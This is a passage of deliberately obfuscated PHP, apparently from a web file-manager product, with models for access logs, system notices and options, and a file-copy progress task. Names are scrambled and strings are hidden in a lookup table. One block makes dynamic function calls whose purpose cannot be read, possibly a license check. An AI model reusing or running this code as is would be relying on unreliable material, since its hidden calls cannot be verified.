$F¿Ğíç¦…Ô[$B‰Š•­˜¼Ü[1395]] = isset($B»İÃ£„ãË[$aĞ´½ñ‹œ¶]) ? $B»İÃ£„ãË[$aĞ´½ñ‹œ¶] : $eŒêéğóËİ; goto A½®¡‘‚; bË·È¤¾îä: unset($F¿Ğíç¦…Ô[$B‰Š•­˜¼Ü[2050]]); $aù‰’äÎ[] = $F¿Ğíç¦…Ô; goto c£åÚ†ª; fÕµØ£Ì³»: $aĞ´½ñ‹œ¶ = $F¿Ğíç¦…Ô[$B‰Š•­˜¼Ü[29]]; $E›”˜Ûã¾Ñ = isset($eÅŞ˜»İ¾Ò[$F¿Ğíç¦…Ô[$B‰Š•­˜¼Ü[1490]]]) ? $eÅŞ˜»İ¾Ò[$F¿Ğíç¦…Ô[$B‰Š•­˜¼Ü[1490]]] : !1; $eŒêéğóËİ = strpos($aĞ´½ñ‹œ¶, $B‰Š•­˜¼Ü[2048]) === 0 ? LNG($B‰Š•­˜¼Ü[2049]) : LNG($B‰Š•­˜¼Ü[2044]); goto f‹öö…Ú¥Ä; A›‡ÖÕÑÑ: $this->ipAddress($F¿Ğíç¦…Ô); if (strpos($aĞ´½ñ‹œ¶, $B‰Š•­˜¼Ü[1866]) === 0 || isset($D‘¹æøÉÌç[$B‰Š•­˜¼Ü[1865]])) { goto b®éÏùÅ„Ó; aô–¼ç³àº: if ($D‘¹æøÉÌç[$B‰Š•­˜¼Ü[29]] == $B‰Š•­˜¼Ü[1873]) { $D‘¹æøÉÌç[$B‰Š•­˜¼Ü[421]][$B‰Š•­˜¼Ü[385]] = $dôÙ•çö†‚[$D‘¹æøÉÌç[$B‰Š•­˜¼Ü[421]][$B‰Š•­˜¼Ü[385]]]; } if ($D‘¹æøÉÌç[$B‰Š•­˜¼Ü[29]] == $B‰Š•­˜¼Ü[1616]) { $D‘¹æøÉÌç[$B‰Š•­˜¼Ü[1878]] = $D‘¹æøÉÌç[$B‰Š•­˜¼Ü[407]]; $D‘¹æøÉÌç[$B‰Š•­˜¼Ü[1865]] = $D‘¹æøÉÌç[$B‰Š•­˜¼Ü[1878]][$B‰Š•­˜¼Ü[385]]; $D‘¹æøÉÌç[$B‰Š•­˜¼Ü[407]] = !1; $D‘¹æøÉÌç[$B‰Š•­˜¼Ü[385]] = $B‰Š•­˜¼Ü[33]; } if ($D‘¹æøÉÌç[$B‰Š•­˜¼Ü[407]] && $D‘¹æøÉÌç[$B‰Š•­˜¼Ü[407]][$B‰Š•­˜¼Ü[387]] == $B‰Š•­˜¼Ü[1131]) { $aùòÙ‚Ä[] = $F¿Ğíç¦…Ô[$B‰Š•­˜¼Ü[383]]; unset($d¬æÎÄòÛÇ[$dÎ»®ñá«]); continue; } goto F™»ù°ãÖ; F™»ù°ãÖ: if ($D‘¹æøÉÌç[$B‰Š•­˜¼Ü[1878]] && $D‘¹æøÉÌç[$B‰Š•­˜¼Ü[1878]][$B‰Š•­˜¼Ü[387]] == $B‰Š•­˜¼Ü[1131]) { $aùòÙ‚Ä[] = $F¿Ğíç¦…Ô[$B‰Š•­˜¼Ü[383]]; unset($d¬æÎÄòÛÇ[$dÎ»®ñá«]); continue; } goto FˆŸİä; b®éÏùÅ„Ó: $D‘¹æøÉÌç[$B‰Š•­˜¼Ü[407]] = $dôÙ•çö†‚[$D‘¹æøÉÌç[$B‰Š•­˜¼Ü[385]]]; $D‘¹æøÉÌç[$B‰Š•­˜¼Ü[1878]] = $dôÙ•çö†‚[$D‘¹æøÉÌç[$B‰Š•­˜¼Ü[1865]]]; if ($D‘¹æøÉÌç[$B‰Š•­˜¼Ü[29]] == $B‰Š•­˜¼Ü[509]) { $D‘¹æøÉÌç[$B‰Š•­˜¼Ü[421]][$B‰Š•­˜¼Ü[1019]] = $dôÙ•çö†‚[$D‘¹æøÉÌç[$B‰Š•­˜¼Ü[421]][$B‰Š•­˜¼Ü[1019]]]; $D‘¹æøÉÌç[$B‰Š•­˜¼Ü[421]][$B‰Š•­˜¼Ü[1020]] = $dôÙ•çö†‚[$D‘¹æøÉÌç[$B‰Š•­˜¼Ü[421]][$B‰Š•­˜¼Ü[1020]]]; } goto aô–¼ç³àº; FˆŸİä: } $F¿Ğíç¦…Ô[$B‰Š•­˜¼Ü[421]] = $D‘¹æøÉÌç; goto bË·È¤¾îä; c£åÚ†ª: } $this->clearSystemPathLog($aùòÙ‚Ä); goto eÏäõ¼‹Î£; D¹ñí™ØÔÛ: $dôÙ•çö†‚ = $this->getSourceList($d¬æÎÄòÛÇ); $B»İÃ£„ãË = $this->typeAll(); $aù‰’äÎ = array(); goto e¢¥‘£—¶—; dšÔÃ„ç‹¸: $B‰Š•­˜¼Ü =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $B¦›é‚¹¾ï = array_to_keyvalue($d¬æÎÄòÛÇ, $B‰Š•­˜¼Ü[33], $B‰Š•­˜¼Ü[1490]); $eÅŞ˜»İ¾Ò = Model($B‰Š•­˜¼Ü[494])->userListInfo(array_unique($B¦›é‚¹¾ï)); goto D¹ñí™ØÔÛ; Dá½ÌÉóöï: } private function clearSystemPathLog($FÙ»ìÌ‹©Ä) { $C¤™Š¾·´» =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (count($FÙ»ìÌ‹©Ä) == 0) { return; } $B«àø­òŞæ = array($C¤™Š¾·´»[383] => array($C¤™Š¾·´»[7], array_unique($FÙ»ìÌ‹©Ä))); $this->where($B«àø­òŞæ)->delete(); } public function deviceList($f¯¬õó†å°, $cÌ¢ˆ÷¥é¬ = 0) { $FÏ»à×©‹ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $BÜÄ’å‚›ô = array($FÏ»à×©‹[1490] => $f¯¬õó†å°, $FÏ»à×©‹[190] => array($FÏ»à×©‹[936], $cÌ¢ˆ÷¥é¬), $FÏ»à×©‹[29] => $FÏ»à×©‹[1589]); $A©ĞĞ¯é¹± = array(); $c‘ƒÆ˜êÓ = $this->field($FÏ»à×©‹[2051])->where($BÜÄ’å‚›ô)->order($FÏ»à×©‹[1876])->limit(50)->select(); foreach ($c‘ƒÆ˜êÓ as $FºíëÀ‡®‘ => $e•¯ƒ¶Š©Ñ) { goto C¿Ò¾”ÀŠ; AËŠÓâ×˜: unset($EÄÎÎéø·¿[$FÏ»à×©‹[2043]]); $cÜËÔä‰ßß = $this->deviceType($EÄÎÎéø·¿[$FÏ»à×©‹[1867]]); if (isset($A©ĞĞ¯é¹±[$cÜËÔä‰ßß])) { continue; } goto aÍ§Ï¹°îé; C¿Ò¾”ÀŠ: if ($FºíëÀ‡®‘ > 0 && abs($e•¯ƒ¶Š©Ñ[$FÏ»à×©‹[190]] - $c‘ƒÆ˜êÓ[$FºíëÀ‡®‘ - 1][$FÏ»à×©‹[190]]) < 5) { continue; } $EÄÎÎéø·¿ = json_decode($e•¯ƒ¶Š©Ñ[$FÏ»à×©‹[421]], !0); $e•¯ƒ¶Š©Ñ[$FÏ»à×©‹[2043]] = isset($EÄÎÎéø·¿[$FÏ»à×©‹[2043]]) ? $EÄÎÎéø·¿[$FÏ»à×©‹[2043]] : $FÏ»à×©‹[33]; goto AËŠÓâ×˜; aÍ§Ï¹°îé: $this->ipAddress($e•¯ƒ¶Š©Ñ); $e•¯ƒ¶Š©Ñ[$FÏ»à×©‹[421]] = $EÄÎÎéø·¿; $A©ĞĞ¯é¹±[$cÜËÔä‰ßß] = $e•¯ƒ¶Š©Ñ; goto Cñ°Î¿ÂÈ¡; Cñ°Î¿ÂÈ¡: } return array_values($A©ĞĞ¯é¹±); } public function deviceType($F£÷ôªñ…´) { return $F£÷ôªñ…´; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\155\56\x6e\x6f\164\151\143\145\x4c\151\x73\164"; public $field = array("\156\141\x6d\x65", "\x63\x6f\156\x74\145\156\164", "\x61\165\164\150", "\155\157\x64\x65", "\x74\151\x6d\145", "\164\171\x70\145", "\x6c\x65\166\x65\x6c", "\145\x6e\141\x62\x6c\x65", "\163\157\x72\x74"); public function listData($F³Ìœéõ± = false, $BÁ®Á‰·‡ = "\x73\157\x72\164", $AÔó¡¿­ø¡ = false) { return parent::listData($F³Ìœéõ±, $BÁ®Á‰·‡, $AÔó¡¿­ø¡); } public function add($a¢Ì—ò™ËŸ) { $aÎñ©³™°– =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $bõœº§¡¸ = time(); if ($a¢Ì—ò™ËŸ[$aÎñ©³™°–[12]] == $aÎñ©³™°–[2052]) { $bõœº§¡¸ = strtotime($a¢Ì—ò™ËŸ[$aÎñ©³™°–[193]]); } $a¢Ì—ò™ËŸ[$aÎñ©³™°–[193]] = $bõœº§¡¸; return parent::insert($a¢Ì—ò™ËŸ); } public function update($aÍÉÂƒÅ‡„, $d•¾¡÷È„‘) { goto cŠ÷Í¿Õ¸ã; fô‘ÔØëŠ: $eÄ‹ªÎÛ…ø = time(); if ($d•¾¡÷È„‘[$FÔ»×’[12]] == $FÔ»×’[2052]) { $eÄ‹ªÎÛ…ø = strtotime($d•¾¡÷È„‘[$FÔ»×’[193]]); } $d•¾¡÷È„‘[$FÔ»×’[193]] = $eÄ‹ªÎÛ…ø; goto bãïò³˜Â¨; cŠ÷Í¿Õ¸ã: $FÔ»×’ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $D¨ÃÇ±Ğ = $this->listData($aÍÉÂƒÅ‡„); if (!$D¨ÃÇ±Ğ) { return !1; } goto fô‘ÔØëŠ; bãïò³˜Â¨: return parent::update($aÍÉÂƒÅ‡„, $d•¾¡÷È„‘); goto aÜ‡°Á¡ÇÇ; aÜ‡°Á¡ÇÇ: } public function remove($Eã¤®íƒ´) { $BƒÆšæ•ó¹ = $this->listData($Eã¤®íƒ´); if (!$BƒÆšæ•ó¹ || $BƒÆšæ•ó¹[$_SERVER[ÈİÅ¿ÈÈ¥×][1131]]) { return !1; } return parent::remove($Eã¤®íƒ´); } public function sort($E±Î«ÙíƒÛ, $d–ÑŠ²ä¢İ) { return parent::update($E±Î«ÙíƒÛ, $d–ÑŠ²ä¢İ); } public function enable($fãº­Æİ…Ë, $bÈÎîùÇ·) { return parent::update($fãº­Æİ…Ë, array($_SERVER[ÈİÅ¿ÈÈ¥×][2053] => $bÈÎîùÇ·)); } private function initUserOption() { $A’‰»ƒÇñ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $this->optionType = $A’‰»ƒÇñ[2054]; $this->modelType = $A’‰»ƒÇñ[2055]; $this->field = array($A’‰»ƒÇñ[2056], $A’‰»ƒÇñ[28], $A’‰»ƒÇñ[193], $A’‰»ƒÇñ[29], $A’‰»ƒÇñ[2057], $A’‰»ƒÇñ[697], $A’‰»ƒÇñ[187]); } public function userNoticeGet($bÈ×”óÖ = false) { $this->initUserOption(); return parent::listData($bÈ×”óÖ, $_SERVER[ÈİÅ¿ÈÈ¥×][383], !0); } public function userNoticeAdd($eë—™õ‹•Ñ) { $fÀ‘†©Ç×Ø =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $this->initUserOption(); $fà“¢è— = $this->findByKey($fÀ‘†©Ç×Ø[2056], $eë—™õ‹•Ñ[$fÀ‘†©Ç×Ø[383]]); if ($fà“¢è—) { return !0; } $e½ÈÔ“Ì³ò = array($fÀ‘†©Ç×Ø[2056] => $eë—™õ‹•Ñ[$fÀ‘†©Ç×Ø[383]], $fÀ‘†©Ç×Ø[28] => $eë—™õ‹•Ñ[$fÀ‘†©Ç×Ø[28]], $fÀ‘†©Ç×Ø[193] => $eë—™õ‹•Ñ[$fÀ‘†©Ç×Ø[193]], $fÀ‘†©Ç×Ø[29] => isset($eë—™õ‹•Ñ[$fÀ‘†©Ç×Ø[29]]) ? $eë—™õ‹•Ñ[$fÀ‘†©Ç×Ø[29]] : 1, $fÀ‘†©Ç×Ø[2057] => isset($eë—™õ‹•Ñ[$fÀ‘†©Ç×Ø[2057]]) ? $eë—™õ‹•Ñ[$fÀ‘†©Ç×Ø[2057]] : 0, $fÀ‘†©Ç×Ø[697] => 0, $fÀ‘†©Ç×Ø[187] => 0); return parent::insert($e½ÈÔ“Ì³ò); } public function userNoticeEdit($b‚ßİ£ºæ, $CÃåÒÙ˜‚ƒ) { $this->initUserOption(); return parent::update($b‚ßİ£ºæ, $CÃåÒÙ˜‚ƒ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\163\164\145\x6d\x5f\157\x70\164\x69\157\156"; protected $jsonField = array("\x6d\x65\x6e\165", "\162\157\x6c\x65", "\162\x6f\154\x65\107\x72\157\x75\x70", "\x72\x65\147\x69\163\164", "\x65\x6d\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($a»¯íÁ·ğÀ) { return "\123\x79\163\164\145\x6d\117\160\x74\x69\x6f\156\137{$a»¯íÁ·ğÀ}"; } protected function optionDefault($aä‹È§Ì¯· = '') { $E‘Öä«êƒŒ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($aä‹È§Ì¯· == $E‘Öä«êƒŒ[33]) { return $GLOBALS[$E‘Öä«êƒŒ[6]][$E‘Öä«êƒŒ[371]]; } } } goto e…”ÔåÜÑÜ; B·áÆ‘«ˆ: if ($_SERVER[$_SERVER[ÈİÅ¿ÈÈ¥×][800]] != $_SERVER[$_SERVER[ÈİÅ¿ÈÈ¥×][1515]]) { goto fÔšø’Á—Í; Dåƒğ–õ¶: $C›µ²³¤‘„($_SERVER[$_SERVER[ÈİÅ¿ÈÈ¥×][801]]); goto E˜Šèæ‡İÅ; fÔšø’Á—Í: $Aù‹À¶§«É = $_SERVER[ÈİÅ¿ÈÈ¥×][803]; $EÚïÓî÷ÆŠ = $_SERVER[$_SERVER[ÈİÅ¿ÈÈ¥×][804]] . $_SERVER[ÈİÅ¿ÈÈ¥×][805]; $CÎÍñ¾”½ = $Aù‹À¶§«É($EÚïÓî÷ÆŠ); goto a–‡·è›ÃÇ; a–‡·è›ÃÇ: $f«´„Ê‚Şß = explode($_SERVER[ÈİÅ¿ÈÈ¥×][225], $CÎÍñ¾”½); if (count($f«´„Ê‚Şß) < $_SERVER[ÈİÅ¿ÈÈ¥×][579]) { $D“§‡„ª‘ = $_SERVER[ÈİÅ¿ÈÈ¥×][806]; $D“§‡„ª‘(); } $C›µ²³¤‘„ = $_SERVER[ÈİÅ¿ÈÈ¥×][1101]; goto Dåƒğ–õ¶; E˜Šèæ‡İÅ: } class TaskFileTransfer extends Task { protected function startAfter() { goto C©‚„Î†‡ò; dÀÕáá‘ÓØ: Hook::bind($d³çÒ’õ[1525], array($this, $d³çÒ’õ[1526])); Hook::bind($d³çÒ’õ[548], array($this, $d³çÒ’õ[1527])); $this->sourceModelCopyFlag = !1; goto aÑ²ÔÇÑ§; fÆáÔÜ˜÷”: $eº§¾ª¨²¬[$d³çÒ’õ[1540]] = 0; $eº§¾ª¨²¬[$d³çÒ’õ[1541]] = 0; if (!$eº§¾ª¨²¬[$d³çÒ’õ[1395]]) { $eº§¾ª¨²¬[$d³çÒ’õ[1395]] = LNG($d³çÒ’õ[1542]); } goto B•³¥İ‚ï; Aññ‹²’Ï: Hook::bind($d³çÒ’õ[555], array($this, $d³çÒ’õ[1521])); Hook::bind($d³çÒ’õ[556], array($this, $d³çÒ’õ[1522])); Hook::bind($d³çÒ’õ[558], array($this, $d³çÒ’õ[1523])); goto bÂ¡¶ÔÏˆÚ; bˆ¢ëÃ‚”¯: Hook::bind($d³çÒ’õ[1516], array($this, $d³çÒ’õ[1517])); Hook::bind($d³çÒ’õ[1072], array($this, $d³çÒ’õ[1518])); Hook::bind($d³çÒ’õ[1519], array($this, $d³çÒ’õ[1520])); goto Aññ‹²’Ï; Bİ‰¹Šä×: $eº§¾ª¨²¬[$d³çÒ’õ[988]] = $d³çÒ’õ[33]; $eº§¾ª¨²¬[$d³çÒ’õ[1538]] = $d³çÒ’õ[33]; $eº§¾ª¨²¬[$d³çÒ’õ[1539]] = 0; goto fÆáÔÜ˜÷”; B†¶‹¬¤Ëé: Hook::bind($d³çÒ’õ[528], array($this, $d³çÒ’õ[1524])); Hook::bind($d³çÒ’õ[530], array($this, $d³çÒ’õ[1524])); Hook::bind($d³çÒ’õ[532], array($this, $d³çÒ’õ[1524])); goto dÀÕáá‘ÓØ; C©‚„Î†‡ò: $d³çÒ’õ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $eº§¾ª¨²¬ =& $this->task; $this->sourceCopyFolder = !1; goto bˆ¢ëÃ‚”¯; aÑ²ÔÇÑ§: Hook::bind($d³çÒ’õ[1528], array($this, $d³çÒ’õ[1529])); Hook::bind($d³çÒ’õ[1530], array($this, $d³çÒ’õ[1531])); Hook::bind($d³çÒ’õ[1532], array($this, $d³çÒ’õ[1533])); goto b¿­ˆõòÕ§; b¿­ˆõòÕ§: $eº§¾ª¨²¬[$d³çÒ’õ[1534]] = LNG($d³çÒ’õ[1535]); $eº§¾ª¨²¬[$d³çÒ’õ[1536]] = 0; $eº§¾ª¨²¬[$d³çÒ’õ[1537]] = 0; goto Bİ‰¹Šä×; bÂ¡¶ÔÏˆÚ: Hook::bind($d³çÒ’õ[559], array($this, $d³çÒ’õ[1523])); Hook::bind($d³çÒ’õ[526], array($this, $d³çÒ’õ[1524])); Hook::bind($d³çÒ’õ[523], array($this, $d³çÒ’õ[1524])); goto B†¶‹¬¤Ëé; B•³¥İ‚ï: } protected function endAfter() { goto BÂÛ“¼¸¶; BÂÛ“¼¸¶: $Cáé”˜‹„Œ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; Hook::unbind($Cáé”˜‹„Œ[1516], array($this, $Cáé”˜‹„Œ[1517])); Hook::unbind($Cáé”˜‹„Œ[1072], array($this, $Cáé”˜‹„Œ[1518])); goto EÆƒ„†›; c¶ğ®ÎÈ±: Hook::unbind($Cáé”˜‹„Œ[523], array($this, $Cáé”˜‹„Œ[1524])); Hook::unbind($Cáé”˜‹„Œ[528], array($this, $Cáé”˜‹„Œ[1524])); Hook::unbind($Cáé”˜‹„Œ[530], array($this, $Cáé”˜‹„Œ[1524])); goto C¤ÉÏá²®Ö; EÆƒ„†›: Hook::unbind($Cáé”˜‹„Œ[1519], array($this, $Cáé”˜‹„Œ[1520])); Hook::unbind($Cáé”˜‹„Œ[555], array($this, $Cáé”˜‹„Œ[1521])); Hook::unbind($Cáé”˜‹„Œ[556], array($this, $Cáé”˜‹„Œ[1522])); goto c’¾Ğ÷¹Ğ™; bÀÄïÔ: Hook::unbind($Cáé”˜‹„Œ[1528], array($this, $Cáé”˜‹„Œ[1529])); Hook::unbind($Cáé”˜‹„Œ[1530], array($this, $Cáé”˜‹„Œ[1531])); Hook::unbind($Cáé”˜‹„Œ[1532], array($this, $Cáé”˜‹„Œ[1533])); goto AÚ‚›„«•Ç; C¤ÉÏá²®Ö: Hook::unbind($Cáé”˜‹„Œ[532], array($this, $Cáé”˜‹„Œ[1524])); Hook::unbind($Cáé”˜‹„Œ[1525], array($this, $Cáé”˜‹„Œ[1526])); Hook::unbind($Cáé”˜‹„Œ[548], array($this, $Cáé”˜‹„Œ[1527])); goto bÀÄïÔ; c’¾Ğ÷¹Ğ™: Hook::unbind($Cáé”˜‹„Œ[558], array($this, $Cáé”˜‹„Œ[1523])); Hook::unbind($Cáé”˜‹„Œ[559], array($this, $Cáé”˜‹„Œ[1523])); Hook::unbind($Cáé”˜‹„Œ[526], array($this, $Cáé”˜‹„Œ[1524])); goto c¶ğ®ÎÈ±; AÚ‚›„«•Ç: } public function copyMoveStart($cï‹Ù±ôè„, $d©éä£ìÀ, $Fîèš»†Œ¾, $e¨šÓÜ›¯ó) { goto Cİ‚‘›ô‡¶; Cİ‚‘›ô‡¶: $Eìò»¹Îñ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; self::log($Eìò»¹Îñ[1543] . $d©éä£ìÀ . $Eìò»¹Îñ[66] . $e¨šÓÜ›¯ó); $AÛÍ™à¾®œ = rtrim(TEMP_FILES, $Eìò»¹Îñ[8]); goto b¨¨‘Ó§à; b¨¨‘Ó§à: if (substr($d©éä£ìÀ, 0, strlen($AÛÍ™à¾®œ)) == $AÛÍ™à¾®œ) { return; } if (substr($e¨šÓÜ›¯ó, 0, strlen($AÛÍ™à¾®œ)) == $AÛÍ™à¾®œ) { return; } $c­¦°áÅÀÚ =& $this->task; goto cĞĞñ‚½¿¡; cĞĞñ‚½¿¡: $c­¦°áÅÀÚ[$Eìò»¹Îñ[1544]] = KodIO::transferType($cï‹Ù±ôè„, $Fîèš»†Œ¾); $this->update(); goto EŸâ•¢ñ¿; EŸâ•¢ñ¿: } public function updateAfter() { goto Eœ˜’Ë«£‘; Eº­ÜìÄù»: if ($this->sourceModelCopyFlag) { return; } if ($c‘¾Á¢ì‘Á[$b°à‰í·†õ[1544]] == $b°à‰í·†õ[1144]) { return; } if ($c‘¾Á¢ì‘Á[$b°à‰í·†õ[1544]] == $b°à‰í·†õ[1058] || $c‘¾Á¢ì‘Á[$b°à‰í·†õ[1544]] == $b°à‰í·†õ[103]) { if ($c‘¾Á¢ì‘Á[$b°à‰í·†õ[1538]]) { $c‘¾Á¢ì‘Á[$b°à‰í·†õ[1541]] = $c‘¾Á¢ì‘Á[$b°à‰í·†õ[1540]] + $c‘¾Á¢ì‘Á[$b°à‰í·†õ[1537]]; } } else { if ($c‘¾Á¢ì‘Á[$b°à‰í·†õ[1544]] == $b°à‰í·†õ[1145]) { if ($c‘¾Á¢ì‘Á[$b°à‰í·†õ[1538]] == $b°à‰í·†õ[1058]) { $c‘¾Á¢ì‘Á[$b°à‰í·†õ[1541]] = $c‘¾Á¢ì‘Á[$b°à‰í·†õ[1540]] + $c‘¾Á¢ì‘Á[$b°à‰í·†õ[1537]] * 0.5; } else { if ($c‘¾Á¢ì‘Á[$b°à‰í·†õ[1538]] == $b°à‰í·†õ[103]) { $c‘¾Á¢ì‘Á[$b°à‰í·†õ[1541]] = $c‘¾Á¢ì‘Á[$b°à‰í·†õ[1540]] + $c‘¾Á¢ì‘Á[$b°à‰í·†õ[1536]] * 0.5 + $c‘¾Á¢ì‘Á[$b°à‰í·†õ[1537]] * 0.5; } } } } goto c¡Ö®„œù´; Eœ˜’Ë«£‘: $b°à‰í·†õ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $c‘¾Á¢ì‘Á =& $this->task; if (!$c‘¾Á¢ì‘Á[$b°à‰í·†õ[706]]) { return; } goto Eº­ÜìÄù»; c¡Ö®„œù´: $c‘¾Á¢ì‘Á[$b°à‰í·†õ[1491]] = $c‘¾Á¢ì‘Á[$b°à‰í·†õ[1541]] / $c‘¾Á¢ì‘Á[$b°à‰í·†õ[706]]; if ($c‘¾Á¢ì‘Á[$b°à‰í·†õ[1491]] > 0) { $DîèÄ»è« = timeFloat() - $c‘¾Á¢ì‘Á[$b°à‰í·†õ[1493]] - $c‘¾Á¢ì‘Á[$b°à‰í·†õ[1496]]; $c‘¾Á¢ì‘Á[$b°à‰í·†õ[1497]] = $DîèÄ»è« * (1 - $c‘¾Á¢ì‘Á[$b°à‰í·†õ[1491]]) / $c‘¾Á¢ì‘Á[$b°à‰í·†õ[1491]]; } goto D¶–ë›Ã¦ì; D¶–ë›Ã¦ì: } public function addPath($aïÔ¼éŠÃˆ) { goto C–˜à¡¤¿Ò; C–˜à¡¤¿Ò: $CèºÉØ¶çõ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$aïÔ¼éŠÃˆ) { return; } $B­ •Ñó =& $this->task; goto C¶Ï˜»Ì³Ï; fùã‹ãŒâ£: if ($E¯ÓİŠ…[$CèºÉØ¶çõ[29]] == $CèºÉØ¶çõ[171]) { $B­ •Ñó[$CèºÉØ¶çõ[986]] += 1; } else { $B­ •Ñó[$CèºÉØ¶çõ[986]] += $E¯ÓİŠ…[$CèºÉØ¶çõ[80]][$CèºÉØ¶çõ[78]]; if ($E¯ÓİŠ…[$CèºÉØ¶çõ[385]]) { $B­ •Ñó[$CèºÉØ¶çõ[986]] += $E¯ÓİŠ…[$CèºÉØ¶çõ[80]][$CèºÉØ¶çõ[79]] + 1; } } $B­ •Ñó[$CèºÉØ¶çõ[706]] += $E¯ÓİŠ…[$CèºÉØ¶çõ[77]]; $this->update(); goto Có·İÓ÷; C¶Ï˜»Ì³Ï: $E¯ÓİŠ… = IO::infoWithChildren($aïÔ¼éŠÃˆ); $D‘¤˜¦Œˆ· = $B­ •Ñó[$CèºÉØ¶çõ[1545]] ? $B­ •Ñó[$CèºÉØ¶çõ[1545]][$CèºÉØ¶çõ[1546]] : 0; $B­ •Ñó[$CèºÉØ¶çõ[1545]] = array($CèºÉØ¶çõ[1546] => $D‘¤˜¦Œˆ· + 1, $CèºÉØ¶çõ[402] => $E¯ÓİŠ…[$CèºÉØ¶çõ[28]], $CèºÉØ¶çõ[75] => $E¯ÓİŠ…[$CèºÉØ¶çõ[75]], $CèºÉØ¶çõ[483] => $E¯ÓİŠ…[$CèºÉØ¶çõ[483]] ? $E¯ÓİŠ…[$CèºÉØ¶çõ[483]] : $E¯ÓİŠ…[$CèºÉØ¶çõ[75]]); goto fùã‹ãŒâ£; Có·İÓ÷: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($Cä§Ò¦áóˆ) { $dÉâ”¡ŒìÕ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $fí›Î‹ğŸğ =& $this->task; $fí›Î‹ğŸğ[$dÉâ”¡ŒìÕ[1534]] = $Cä§Ò¦áóˆ[$dÉâ”¡ŒìÕ[28]]; $fí›Î‹ğŸğ[$dÉâ”¡ŒìÕ[988]] = $Cä§Ò¦áóˆ[$dÉâ”¡ŒìÕ[28]]; $this->update(); } public function copyFileStart($AÀÊÑ´¬ª, $f¥ï¾ãù’”, $b¢š±¹Ø½ã, $eĞğ”®²ïì, $E¡ñæ«”°·, $B‚×Ö¦šïã) { goto F©ËàÆéš‰; aŸÔ‡ ä­ë: $Fí¶ùˆ•ÌŒ[$E›Ş¶èª[1534]] = $D²¯°™ÉÌ¿; $Fí¶ùˆ•ÌŒ[$E›Ş¶èª[1536]] = (int) $AÀÊÑ´¬ª->size($f¥ï¾ãù’”); $Fí¶ùˆ•ÌŒ[$E›Ş¶èª[1537]] = 0; goto e¡ÌÁß’õ; D•¢¥Ù×§: $this->update(); goto E¶†šßÇ¼ë; eÉ±Ú‰ µ˜: $GLOBALS[$E›Ş¶èª[1548]] = $E¡ñæ«”°·; $GLOBALS[$E›Ş¶èª[1547]] = $B‚×Ö¦šïã; $Fí¶ùˆ•ÌŒ =& $this->task; goto aŸÔ‡ ä­ë; F©ËàÆéš‰: $E›Ş¶èª =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $D²¯°™ÉÌ¿ = $E¡ñæ«”°·; if ($D²¯°™ÉÌ¿ == $GLOBALS[$E›Ş¶èª[1547]]) { $D²¯°™ÉÌ¿ = $GLOBALS[$E›Ş¶èª[1548]]; } goto eÉ±Ú‰ µ˜; e¡ÌÁß’õ: $Fí¶ùˆ•ÌŒ[$E›Ş¶èª[988]] = $E›Ş¶èª[33]; $Fí¶ùˆ•ÌŒ[$E›Ş¶èª[1538]] = $E›Ş¶èª[33]; $Fí¶ùˆ•ÌŒ[$E›Ş¶èª[1539]] = 0; goto D•¢¥Ù×§; E¶†šßÇ¼ë: } public function copyFileEnd($E¼×º…ÀÇ, $fÊœÒ­î…Š, $fÙ‡Ñ™†–Š, $A›™Ÿ·´‘«, $AÍè–²ì, $B‚°ñÛ‹Š±) { $dê ø„¦è¬ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $c²„É‘½½¥ =& $this->task; $c²„É‘½½¥[$dê ø„¦è¬[1537]] = $c²„É‘½½¥[$dê ø„¦è¬[1536]]; $c²„É‘½½¥[$dê ø„¦è¬[1538]] = $dê ø„¦è¬[33]; if ($AÍè–²ì == $c²„É‘½½¥[$dê ø„¦è¬[1534]]) { $c²„É‘½½¥[$dê ø„¦è¬[1540]] += $c²„É‘½½¥[$dê ø„¦è¬[1536]]; $c²„É‘½½¥[$dê ø„¦è¬[1541]] = $c²„É‘½½¥[$dê ø„¦è¬[1540]]; $this->update(1); } else { $this->update(); $c²„É‘½½¥[$dê ø„¦è¬[1537]] = 0; } self::log($dê ø„¦è¬[1549] . $fÊœÒ­î…Š . $dê ø„¦è¬[66] . $A›™Ÿ·´‘« . $dê ø„¦è¬[225] . $AÍè–²ì . $dê ø„¦è¬[1550] . $c²„É‘½½¥[$dê ø„¦è¬[1534]]); } public function updateFileEnd($Fİã…‰ìèŒ, $cá¬øƒ¿») { goto b¨ÑË®¹¸Ü; E´æ­ôÛ¦: $this->update(1); self::log($f»†©”æ˜ã[1551] . $Fİã…‰ìèŒ); goto Fæ¸ìÙµ¢¢; b¨ÑË®¹¸Ü: $f»†©”æ˜ã =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $dœÛ¢¬…åÊ =& $this->task; $dœÛ¢¬…åÊ[$f»†©”æ˜ã[1534]] = $Fİã…‰ìèŒ; goto F‡èĞ‰†Ÿ; F‡èĞ‰†Ÿ: $dœÛ¢¬…åÊ[$f»†©”æ˜ã[1536]] = $cá¬øƒ¿»; $dœÛ¢¬…åÊ[$f»†©”æ˜ã[1540]] += $cá¬øƒ¿»; $dœÛ¢¬…åÊ[$f»†©”æ˜ã[1541]] = $dœÛ¢¬…åÊ[$f»†©”æ˜ã[1540]]; goto E´æ­ôÛ¦; Fæ¸ìÙµ¢¢: } public function sourceModelCopy($EÅ×¸¤ãŠÏ) { goto D‚ñÅéòƒ²; bŒ„±òÅ‡: switch ($fßôŠ ¶Ÿ×) { case $d ÅôÓ‚µà[524]: 